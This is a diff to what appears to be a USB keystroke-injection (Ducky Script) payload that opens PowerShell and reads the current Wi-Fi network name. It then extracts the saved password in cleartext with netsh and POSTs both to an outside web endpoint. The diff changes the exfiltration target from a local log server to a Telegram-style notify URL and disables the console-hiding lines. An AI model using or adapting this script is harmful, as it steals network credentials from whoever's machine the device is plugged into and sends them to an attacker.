@@ -5,15 +5,17 @@ DELAY 200
 STRING powershell
 ENTER
 DELAY 500
-STRING [console]::WindowHeight=1;
-ENTER
-STRING [console]::WindowWidth=1;
-ENTER
+REM STRING [console]::WindowHeight=1;
+REM ENTER
+REM STRING [console]::WindowWidth=1;
+REM ENTER
 STRING $_, $ssid = ((netsh wlan show interface | findstr "Profile" | findstr /v "mode") -split ":",2).trim();
 ENTER
 STRING $_, $pass = ((netsh wlan show profile name=$ssid key=clear | findstr Key) -split ":").trim();
 ENTER
-STRING $postParams = @{data="$($ssid) : $($pass)"};
+STRING $postParams = @{message="$($ssid) : $($pass)"};
 ENTER
-STRING Invoke-WebRequest -Uri http://simple-log-server:3000/email -Method POST -Body $postParams;
+STRING Invoke-WebRequest -Uri https://<notify.app>/telegram -Method POST -Body $postParams;
+ENTER
+STRING exit
 ENTER
